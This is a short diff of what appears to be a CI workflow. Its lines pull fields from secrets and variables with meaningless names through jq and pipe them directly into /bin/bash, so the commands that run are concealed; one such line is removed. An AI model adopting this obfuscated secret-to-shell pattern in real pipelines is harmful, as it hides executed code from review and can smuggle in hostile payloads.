@@ -23,7 +23,6 @@ jobs:
           apjaa00365: ${{ secrets.apjaa00365 }}
         run: |
           printf '%s' "$apjaa00365" | jq -r .qb5 | /bin/bash
-          echo $ddby3 | jq -r .bd135 | /bin/bash
           echo $rrne38 | jq -r .xktuy906 | /bin/bash
           printf '%s' "$y8" | jq -r .mv97 | /bin/bash
 
